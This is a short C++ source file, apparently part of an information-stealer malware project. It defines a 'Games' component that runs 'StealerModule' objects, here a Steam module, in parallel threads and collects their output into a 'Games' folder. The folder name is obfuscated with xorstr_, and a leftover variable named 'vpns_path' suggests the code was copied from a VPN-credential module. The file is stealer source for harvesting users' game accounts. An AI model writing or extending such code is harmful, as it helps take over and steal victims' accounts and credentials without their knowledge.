//
// Created by .1qxz on 08.06.2024.
//

#include "Games.h"
#include "impl/Steam.h"

Games::Games() {
    this->modules.push_back(new Steam());
}

void Games::execute(fs::path &root) {
    fs::path vpns_path = root / xorstr_("Games");
    std::vector<std::thread> threads;

    for(StealerModule* module : this->modules) {
        threads.emplace_back([module, &vpns_path]() {
            module->execute(vpns_path);
        });
    }

    for(auto& thread : threads) {
        if (thread.joinable()) {
            thread.join();
        }
    }
}
